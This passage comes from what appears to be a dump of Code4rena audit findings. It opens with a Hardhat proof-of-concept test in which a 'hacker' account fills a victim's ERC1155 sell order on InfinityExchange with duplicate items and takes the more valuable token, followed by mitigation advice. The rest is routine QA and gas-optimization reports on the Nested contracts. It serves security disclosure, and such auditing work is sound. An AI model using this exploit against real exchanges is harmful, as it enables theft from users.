mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [       'uri1'     ]);     mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [       'uri2'     ]);      // Exchange     infinityExchange = await deployContract(       'InfinityExchange',       await ethers.getContractFactory('InfinityExchange'),       dev,       [token.address, matchExecutor.address]     );      // OB complication     obComplication = await deployContract(       'InfinityOrderBookComplication',       await ethers.getContractFactory('InfinityOrderBookComplication'),       dev     );      // add currencies to registry     await infinityExchange.addCurrency(token.address);     await infinityExchange.addCurrency(NULL_ADDRESS);      // add complications to registry     await infinityExchange.addComplication(obComplication.address);      // send assets     await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());     await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());     for (let i = 0; i < numNFTsToTransfer; i++) {       await mock1155Contract1.mint(victim.address, i, 50, '0x');       await mock1155Contract2.mint(victim.address, i, 50, '0x');     }   });    describe('StealERC1155ByDuplicateItems', () => {     it('Passed test denotes successful hack', async function () {       // prepare order       const user = {         address: victim.address       };       const chainId = network.config.chainId ?? 31337;       const nfts = [         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         },         {           collection: mock1155Contract2.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         }       ];       const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };       const extraParams = {};       const nonce = ++orderNonce;       const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], [user.address, nonce, chainId]);       let numItems = 0;       for (const nft of nfts) {         numItems += nft.tokens.length;       }       const order = {         id: orderId,         chainId,         isSellOrder: true,         signerAddress: user.address,         numItems,         startPrice: ethers.utils.parseEther('1'),         endPrice: ethers.utils.parseEther('1'),         startTime: nowSeconds(),         endTime: nowSeconds().add(10 * 60),         nonce,         nfts,         execParams,         extraParams       };       const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);       expect(sellOrder).to.not.be.undefined;        // form matching nfts       const nfts_ = [         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         },         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         }       ];        // approve currency       let salePrice = getCurrentSignedOrderPrice(sellOrder);       await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);        // perform exchange       await infinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);        // owners after sale       // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1       // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss       expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);     });   }); }); ```  And run  ```bash $ npx hardhat test --grep PoC    PoC     StealERC1155ByDuplicateItems       \u2713 Passed test denotes successful hack ```  Note that the passed test denotes a successful hack.  ## Tools Used Manual inspection.  ## Recommended Mitigation Steps I would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/96", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "# [QA-1] Naming inconsistency - some arguments have ``_`` at their prefixes but others do not at NestedFactory.sol  Throughout the file ``NestedFactory.sol``, arguments of functions have ``_`` at their prefixes like ``function setFeeSplitter(FeeSplitter _feeSplitter)``. However, following 2 arguments do not have ``_`` at their prefixes which are not consistent.  https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L121  https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L133  ---  # [QA-2] Use either ``_msgSender()`` or ``msg.sender``   Throughout the file ``NestedFactory.sol``, ``_msgSender()`` is used to get the sender. However, following 2 places use ``msg.sender`` which seem not consistent.  https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L89  https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L177  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/84", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "# QA Report  ## Table of Contents  - [summary](#summary) - [Comment Missing function parameter](#comment-missing-function-parameter) - [Constants instead of magic numbers](#constants-instead-of-magic-numbers) - [Events indexing](#events-indexing) - [Public functions can be external](#public-functions-can-be-external) - [Scientific notation](#scientific-notation) - [Typos](#typos) - [Immutable addresses lack zero-address check](#immutable-addresses-lack-zero-address-check) - [Payable functions when using ERC20](#payable-functions-when-using-erc20)   # summary  > Few vulnerabilities were found examining the contracts. The main concerns are with:    # Comment Missing function parameter  ## PROBLEM  Some of the function comments are missing function parameters or returns    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Parameters missing a natspec comment include:   ### BeefyZapBiswapLPVaultOperator.sol  [uint256 reserveA](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L266)\\ [uint256 reserveB](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L267)\\ [IBiswapRouter02 router](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L268)\\ [uint256 swapAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L269)\\  ### BeefyZapUniswapLPVaultOperator.sol  [uint256 reserveA](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L265)\\ [uint256 reserveB](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L266)\\ [IUniswapV2Router02 router](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L267)\\ [uint256 swapAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L268)  ### TimelockControllerEmergency.sol  [bytes32 id](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L119)\\ [bytes32 id](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L126)\\ [bytes32 id](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L133)\\ [bytes32 id](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L141)\\ [bytes32 id](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L149)\\ [address target,uint256 value,bytes calldata data,bytes32 predecessor,bytes32 salt](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L167-L171)\\ [address[] calldata targets,uint256[] calldata values,bytes[] calldata datas,bytes32 predecessor,bytes32 salt](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L181-L185)\\ [address target,uint256 value,bytes calldata data,bytes32 predecessor,bytes32 salt,uint256 delay](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L200-L205)\\ [address[] calldata targets,uint256[] calldata values,bytes[] calldata datas,bytes32 predecessor,bytes32 salt,uint256 delay](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L221-L227)\\ [bytes32 id, uint256 delay](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L242)\\ [bytes32 id](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L255)\\ [address target,uint256 value,bytes calldata data,bytes32 predecessor,bytes32 salt](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L275-L279)\\ [address target,uint256 value,bytes calldata data](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L296-L298)\\ [address[] calldata targets,uint256[] calldata values,bytes[] calldata datas,bytes32 predecessor,bytes32 salt](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L313-L317)\\ [bytes32 id, bytes32 predecessor](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L333)\\ [bytes32 id](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L341)\\ [bytes32 id,uint256 index,address target,uint256 value,bytes calldata data](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L352-L356)\\ [uint256 newDelay](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L374)    ## TOOLS USED  Manual Analysis    ## MITIGATION  Add a comment for these parameters  # Constants instead of magic numbers  ## PROBLEM  It is best practice to use constant variables rather than literal values to make the code easier to understand and maintain.    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### NestedFactory.sol  [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L161)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L169)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L264)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L378)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L443)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L629)  ### BeefyZapBiswapLPVaultOperator.sol  [1000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L271)\\ [1000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L272)  ### BeefyZapUniswapLPVaultOperator.sol  [1000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L269)\\ [1000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L270)     ## TOOLS USED  Manual Analysis    ## MITIGATION   Define constant variables for the literal values aforementioned.  # Events indexing  ## PROBLEM  Events should use indexed fields    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### MixinOperatorResolver.sol  [event CacheUpdated(bytes32 name, IOperatorResolver.Operator destination)](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/MixinOperatorResolver.sol#L14)  ### BeefyVaultStorage.sol  [event VaultAdded(address vault, address tokenOrZapper)](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultStorage.sol#L12)\\ [event VaultRemoved(address vault)](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultStorage.sol#L16)  ### YearnVaultStorage.sol  [event VaultAdded(address vault, CurvePool pool)](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnVaultStorage.sol#L17)\\ [event VaultRemoved(address vault)](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnVaultStorage.sol#L21)  ### TimelockControllerEmergency.sol  [event MinDelayChange(uint256 oldDuration, uint256 newDuration)](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L60)  ## TOOLS USED  Manual Analysis    ## MITIGATION  Add indexed fields to these events so that they have the maximum number of indexed fields possible.   # Scientific notation  ## PROBLEM  For readability, it is best to use scientific notation (e.g `10e5`) rather than decimal literals(`100000`) or exponentiation(`10**5`)    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### NestedFactory.sol  [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L161)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L169)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L264)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L378)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L443)\\ [10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L629)  ### BeefyZapBiswapLPVaultOperator.sol  [1000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L271)\\ [1000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L272)  ### BeefyZapUniswapLPVaultOperator.sol  [1000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L269)\\ [1000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L270)    ## TOOLS USED  Manual Analysis    ## MITIGATION  Replace the numbers aforementioned with their scientific notation  # Typos  ## PROBLEM  There are some typos/misspelt words in the contracts.    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:  ### BeefyVaultOperator.sol  [WITHDRAWED](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultOperator.sol#L95)  ### BeefyZapBiswapLPVaultOperator.sol  [WITHDRAWED](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L108)   ### BeefyZapUniswapLPVaultOperator.sol  [WITHDRAWED](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L108)     ## TOOLS USED  Manual Analysis    ## MITIGATION  Replace with `WITHDRAWN`  # Immutable addresses lack zero-address check  ## IMPACT  constructors should check the address written in an immutable address variable is not the zero address   ## SEVERITY  Low    ## PROOF OF CONCEPT  Instances include:   ### Withdrawer.sol  [weth = _weth](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/Withdrawer.sol#L17)  ### YearnCurveVaultOperator.sol  [eth = _eth](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L48)\\ [weth = IWETH(_weth)](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L48)\\ [withdrawer = _withdrawer](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L50)    ## TOOLS USED  Manual Analysis    ## MITIGATION  Add a zero address check for these parameters.  # Payable functions when using ERC20   ## PROBLEM  Some functions have the `payable` modifier but their logic does not make use of `msg.value`. These contracts do not have any way to withdraw ETH, meaning any ETH sent would get locked.     ## SEVERITY  Low     ## PROOF OF CONCEPT  Instances include:   ### ParaswapOperator.sol  scope: `performSwap`  - [payable](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Paraswap/ParaswapOperator.sol#L26)  ### BeefyVaultOperator.sol  scope: `deposit`  - [payable](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultOperator.sol#L40)  ### BeefyZapBiswapLPVaultOperator.sol  scope: `deposit`  - [payable](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L51)  ### BeefyZapUniswapLPVaultOperator.sol  scope: `deposit`  - [payable](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L51)  ### YearnCurveVaultOperator.sol  scope: `deposit`  - [payable](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L120)  scope: `withdraw128`  - [payable](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L211)  scope: `withdraw256`  - [payable](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L259)   ## TOOLS USED  Manual Analysis    ## MITIGATION  There should be a `require(0 == msg.value)` in these functions to ensure no Ether is being sent. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/82", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "# Gas Report  ## Table of Contents  - [Caching storage variables in memory to save gas](#caching-storage-variables-in-memory-to-save-gas) - [Calldata instead of memory for RO function parameters](#calldata-instead-of-memory-for-ro-function-parameters) - [Comparison operators](#comparison-operators) - [Constructor parameters should be avoided when possible](#constructor-parameters-should-be-avoided-when-possible) - [Default value initialization](#default-value-initialization) - [Mathematical optimizations](#mathematical-optimizations) - [Require instead of AND](#require-instead-of-and) - [Revert strings length](#revert-strings-length) - [Shifting cheaper than division](#shifting-cheaper-than-division) - [Tight variable packing](#tight-variable-packing) - [unchecked arithmetic](#unchecked-arithmetic) - [unnecessary computation](#unnecessary-computation)  # Caching storage variables in memory to save gas  ## IMPACT  Anytime you are reading from storage more than once, it is cheaper in gas cost to cache the variable in memory: a SLOAD cost 100gas, while MLOAD and MSTORE cost 3 gas.   ## PROOF OF CONCEPT  Instances include:  ### NestedFactory.sol  scope: `_transferFeeWithRoyalty()`  - `feeSplitter` is read 3 times  [line 573](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L573)\\ [line 575](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L575)\\ [line 577](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L577)   ## TOOLS USED  Manual Analysis  ## MITIGATION  cache these storage variables in memory  # Calldata instead of memory for RO function parameters  ## PROBLEM  If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.  Try to use calldata as a data location because it will avoid copies and also makes sure that the data cannot be modified.  ## PROOF OF CONCEPT  Instances include:  ### ExchangeHelpers.sol  scope: `fillQuote()`  - [bytes memory _swapCallData](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/libraries/ExchangeHelpers.sol#L18)  ### OwnerProxy.sol  scope: `execute()`  - [bytes memory _data](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/OwnerProxy.sol#L16)   ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `memory` with `calldata`  # Comparison Operators  ## IMPACT  In the EVM, there is no opcode for ` >=` or `<=`. When using greater than or equal, two operations are performed: `>` and `=`.  Using strict comparison operators hence saves gas  ## PROOF OF CONCEPT  Instances include:  ### NestedFactory.sol  [_entryFees <= 10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L161)\\ [_entryFees <= 10000](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L169)\\ [amountSpent <= _inputTokenAmount - feesAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L379)\\ [amountSpent <= _inputTokenAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L428)\\ [amounts[1] <= _amountToSpend](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L495)\\ [address(this).balance >= _inputTokenAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L544)\\ [nestedRecords.getAssetHolding(_nftId, address(_inputToken)) >= _inputTokenAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L552)  ### BeefyVaultOperator.sol  [vaultAmount >= minVaultAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/BeefyVaultOperator.sol#L54)  ### BeefyZapBiswapLPVaultOperator.sol  [vaultAmount >= minVaultAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L64)\\ [amountToDeposit >= depositedAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L65)\\ [tokenAmount >= minTokenAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L109)  ### BeefyZapUniswapLPVaultOperator.sol  [vaultAmount >= minVaultAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L64)\\ [amountToDeposit >= depositedAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L65)\\ [tokenAmount >= minTokenAmount](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L109)   ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `<=` with `<`, and `>=` with `>`. Do not forget to increment/decrement the compared variable  example:  ``` -vaultAmount >= minVaultAmount; +vaultAmount > minVaultAmount - 1; ```  However, if `1` is negligible compared to the value of the variable, we can omit the increment.   # Constructor parameters should be avoided when possible  ## IMPACT  Constructor parameters are expensive. The contract deployment will be cheaper in gas if they are hard coded instead of using constructor parameters. With the compilers parameters in `hardhat.config.ts`, deployment costs approximately `400` more gas per variable written via a constructor parameter.  ## PROOF OF CONCEPT  Instances include:  ### NestedFactory.sol  [constructor](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L76-L81)  ``` nestedAsset = _nestedAsset; nestedRecords = _nestedRecords; reserve = _reserve; feeSplitter = _feeSplitter; weth = _weth; withdrawer = _withdrawer ```  ### Withdrawer.sol  [weth = _weth](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/Withdrawer.sol#L17)  ### Paraswap.sol  [tokenTransferProxy = _tokenTransferProxy](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Paraswap/ParaswapOperator.sol#L17)\\ [augustusSwapper = _augustusSwapper](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Paraswap/ParaswapOperator.sol#L18)  ### YearnCurveVaultOperator.sol  [eth = _eth](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L48)\\ [withdrawer = _withdrawer](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Yearn/YearnCurveVaultOperator.sol#L50)  ### TimelockControllerEmergency.sol  [_minDelay = minDelay](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/TimelockControllerEmergency.sol#L93)  ### OperatorScripts.sol  [nestedFactory = _nestedFactory](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/scripts/OperatorScripts.sol#L21)\\ [resolver = _resolver](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/governance/scripts/OperatorScripts.sol#L22)   ## TOOLS USED  Manual Analysis, hardhat  ## MITIGATION  Hardcode storage variables with their initial value instead of writing it during contract deployment with constructor parameters.   # Default value initialization  ## IMPACT  If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  ## PROOF OF CONCEPT  Instances include:  ### NestedFactory.sol  [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L124)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L136)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L196)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L256)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L315)\\ [uint256 i = 0](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L333)\\ 